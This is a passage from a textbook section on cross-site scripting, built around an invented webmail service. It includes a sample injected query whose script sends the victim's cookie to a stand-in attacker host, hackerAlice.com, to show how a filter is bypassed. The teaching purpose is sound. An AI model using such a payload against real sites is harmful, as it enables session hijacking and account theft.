  md: '# 7.4.2 Cross-site Scripting and Cross-site Remote Forgery Attacks


    Cross-site Scripting (XSS) attack is another typical form of code injection on
    web applications. It takes advantage of a user''s trust in a website and can be
    used to steal user cookies. There are many variations of XSS attack.


    Example 1. Assume that GardenMail.com is a web-based email system. It uses cookies
    to maintain session status after users log in. In this example, the victim, Venice,
    and the attacker, Alice, are both users of GardenMail.com.


    GardenMail provides a special service virtual flower that is not available in
    similar webmail systems. The service allows users to embed flower pictures in
    their emails. To do so, on the compose page of GardenMail.com, there is a search
    box that allows the user to search for the flower by typing its name or the intended
    use. Once the search button is clicked, a request is sent to the server via XHR.
    The server will respond with a snippet of HTML, which is embedded in the email
    body. For example, if a user tries to search for flowers suitable as a birthday
    gift, the following HTML snippet will be generated and inserted into the user''s
    servlet. At the server side, there is another servlet named getFlower. The servlet
    takes a query (in the form of GET parameter q) and displays the flower image retrieved
    from server database.


    ```

    <a target="new"

    url="http://www.gardenmail.com/getFlower?q=birthday+gift"> Click to get flower!</a>

    ```


    To defend against XSS attack, at the server side of GardenMail.com, each web email
    exchanged on the server must undergo inspection. The security inspection will
    remove any hyperlinks in the email, other than the one generated by GardenMail.com
    (i.e., the hyperlink that accesses the getFlower servlet). However, Alice can
    still trick Venice into an XSS trap. For example, Alice can type the following
    string ''a'' as query for flower:


    ```

    birth onclick="<script>document.location=''http://www.hackerAlice.com/getCookie.jsp?c=''+document.cookie</script>"

    ```


    The preceding query results in the following snippet to be embedded in Alice''s
    email to Venice, which passes the security inspection. The code is the result
    of string concatenation executed at the server side.'
